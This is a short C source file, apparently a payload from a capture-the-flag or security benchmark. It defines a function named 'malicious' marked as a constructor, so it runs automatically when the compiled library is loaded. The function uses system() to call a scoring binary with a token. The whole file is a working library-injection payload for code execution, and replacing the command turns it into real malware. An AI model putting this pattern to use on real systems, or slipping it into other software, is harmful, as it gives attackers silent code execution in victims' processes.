#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 69f261b6-aa4e-4f0e-9d84-e5cd6a929db9");
}
